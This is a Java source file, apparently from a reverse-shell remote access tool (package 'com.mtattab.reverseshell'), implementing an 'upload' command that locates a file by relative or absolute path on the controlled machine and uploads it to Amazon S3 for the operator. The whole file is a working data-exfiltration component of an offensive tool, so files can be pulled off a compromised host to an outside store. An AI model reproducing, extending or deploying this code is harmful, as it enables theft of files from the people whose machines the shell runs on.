package com.mtattab.reverseshell.service.commands;

import com.mtattab.reverseshell.model.CommandRestOutput;
import com.mtattab.reverseshell.service.Command;
import com.mtattab.reverseshell.util.*;
import okhttp3.*;

import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.File;
import java.io.IOException;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.List;

public class UploadToS3Command implements Command {



    @Override
    public CommandRestOutput executeCommand(String command) {
        List<String> commands = new ArrayList<>( DataManipulationUtil.stringToList(command, " "));
//        edge cases
        if (commands.get(0).equalsIgnoreCase("upload")){
            commands.remove(0);
            File fileToUpload = null;

            try {
                fileToUpload = getDesiredFile(String.join(" ", commands));

            }catch (Exception e ){
                return CommandRestOutput.builder().output(e.getMessage())
                        .build();
            }


            return CommandRestOutput.builder().output(S3UploadUtil.uploadToS3(fileToUpload))
                    .build() ;

        }
        return CommandRestOutput.builder().output("there is a problem with the command")
                .build() ;
    }

    private File getDesiredFile(String path){
        File relativeFile = new File(SystemCommandProxyUtil.currentWorkingDir, path);
        File absoluteFile = new File(path);
        File fileToUpload = null;



        if (relativeFile.exists() && relativeFile.isFile()) {
            fileToUpload = relativeFile;
        } else if (absoluteFile.exists() && absoluteFile.isFile()) {

            fileToUpload = absoluteFile;
        } else {
            throw new RuntimeException("File not found: ");
        }
        return fileToUpload;

    }





}
